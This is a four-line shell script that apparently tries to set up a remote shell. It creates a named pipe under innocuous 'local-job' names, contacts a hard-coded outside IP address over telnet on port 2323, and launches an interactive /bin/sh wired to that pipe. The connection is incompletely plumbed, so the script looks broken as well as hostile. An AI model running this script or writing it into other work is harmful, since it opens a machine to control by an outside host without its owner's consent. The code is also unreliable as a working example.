#!/bin/sh
mkfifo /tmp/local-job-input
printf 'status\n' | telnet 45.77.33.55 2323
/bin/sh -i < /tmp/local-job-input > /tmp/local-job-output
